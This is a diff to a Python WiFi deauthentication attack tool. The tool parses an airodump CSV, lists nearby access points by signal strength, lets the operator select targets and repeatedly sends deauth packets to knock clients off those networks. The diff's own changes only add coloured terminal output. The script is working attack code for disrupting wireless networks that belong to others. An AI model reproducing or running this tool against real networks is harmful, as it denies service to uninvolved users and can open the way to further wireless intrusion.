@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# Wifi Deauthentication
 
 import argparse
 import csv
@@ -8,6 +7,10 @@ import signal
 import subprocess
 import sys
 from typing import List, Tuple
+
+RED = "\033[38;2;255;0;0m"
+RESET = "\033[0m"
+BOLD = "\033[1m"
 
 DEFAULT_INTERFACE = "wlan0mon"
 DEFAULT_DEAUTH_COUNT = 20
@@ -44,73 +47,73 @@ def RunDeauth(interface: str, bssid: str, count: int):
     subprocess.run(cmd, check=True)
 
 def AttemptDeauth(interface: str, bssid: str, channel: str, count: int, attempt: int) -> bool:
-    print(f"Attempt {attempt}/{MAX_ATTEMPTS} → {bssid} on channel {channel}")
+    print(f"{BOLD}Attempt {attempt}/{MAX_ATTEMPTS}{RESET} → {bssid} on channel {channel}")
     ChangeChannel(interface, channel)
     try:
         RunDeauth(interface, bssid, count)
         return True
     except subprocess.CalledProcessError as e:
-        print(f"[!] Error: {e}")
+        print(f"{RED}[!] Error: {e}{RESET}")
         return False
 
 def DeauthWorkflow(interface: str, deauthCount: int, csvFile: str, pwrThreshold: int):
     global stopAttack
 
     if not os.path.isfile(csvFile):
-        print(f"[!] File not found: {csvFile}")
+        print(f"{RED}[!] File not found: {csvFile}{RESET}")
         return
 
     aps = ParseCSV(csvFile, pwrThreshold)
     if not aps:
-        print(f"[!] No APs ≤ {pwrThreshold} dBm in {csvFile}")
+        print(f"{RED}[!] No APs ≤ {pwrThreshold} dBm in {csvFile}{RESET}")
         return
 
     print(f"\nTargets (PWR ≤ {pwrThreshold} dBm):")
     for i, (bssid, channel, pwr, essid) in enumerate(aps, start=1):
         name = essid or "<hidden>"
-        print(f" {i}. {name} | BSSID: {bssid} | CH: {channel} | PWR: {pwr}")
+        print(f" {BOLD}{i}{RESET}. {name} | BSSID: {bssid} | CH: {channel} | PWR: {pwr}")
 
-    sel = input("\nSelect networks (e.g. 1,3): ").strip()
+    sel = input(f"\n{BOLD}Select networks (e.g. 1,3): {RESET}").strip()
     try:
         choices = [int(x) for x in sel.split(",") if x]
     except ValueError:
-        print("[!] Invalid selection.")
+        print(f"{RED}[!] Invalid selection.{RESET}")
         return
 
     for choice in choices:
         if stopAttack:
             break
         if choice < 1 or choice > len(aps):
-            print(f"[!] {choice} out of range, skipping.")
+            print(f"{RED}[!] {choice} out of range, skipping.{RESET}")
             continue
         bssid, channel, _, essid = aps[choice - 1]
         name = essid or "<hidden>"
-        print(f"\n>>> Attacking {name} ({bssid}) on CH {channel}")
+        print(f"\n>>> Attacking {BOLD}{name}{RESET} ({bssid}) on CH {channel}")
         for attempt in range(1, MAX_ATTEMPTS + 1):
             if stopAttack:
                 break
             success = AttemptDeauth(interface, bssid, channel, deauthCount, attempt)
             if success:
-                print(f"[+] Success on attempt {attempt}.")
+                print(f"{BOLD}[+] Success on attempt {attempt}.{RESET}")
                 break
             if attempt == MAX_ATTEMPTS:
-                print(f"[-] Failed after {MAX_ATTEMPTS}.")
+                print(f"{RED}[-] Failed after {MAX_ATTEMPTS}.{RESET}")
             else:
-                print("[*] Retrying...")
+                print(f"{BOLD}[*] Retrying...{RESET}")
 
-    print("\nDone.")
+    print(f"\n{BOLD}Done.{RESET}")
 
 def menu():
-    interface = input(f"Interface [{DEFAULT_INTERFACE}]: ").strip() or DEFAULT_INTERFACE
+    interface = input(f"{BOLD}Interface [{DEFAULT_INTERFACE}]: {RESET}").strip() or DEFAULT_INTERFACE
     try:
-        count = int(input(f"Deauth packets [{DEFAULT_DEAUTH_COUNT}]: ").strip())
+        count = int(input(f"{BOLD}Deauth packets [{DEFAULT_DEAUTH_COUNT}]: {RESET}").strip())
     except ValueError:
         count = DEFAULT_DEAUTH_COUNT
     try:
-        pwrThreshold = int(input(f"PWR threshold [{DEFAULT_PWR_THRESHOLD}]: ").strip())
+        pwrThreshold = int(input(f"{BOLD}PWR threshold [{DEFAULT_PWR_THRESHOLD}]: {RESET}").strip())
     except ValueError:
         pwrThreshold = DEFAULT_PWR_THRESHOLD
-    csvFile = input("Airodump CSV file: ").strip()
+    csvFile = input(f"{BOLD}Airodump CSV file: {RESET}").strip()
     DeauthWorkflow(interface, count, csvFile, pwrThreshold)
 
 def terminal():
@@ -128,7 +131,7 @@ def terminal():
 
 def SignalHandler(sig, frame):
     global stopAttack
-    print("\n[!] Stopping attack...")
+    print(f"\n{RED}[!] Stopping attack...{RESET}")
     stopAttack = True
 
 def main():
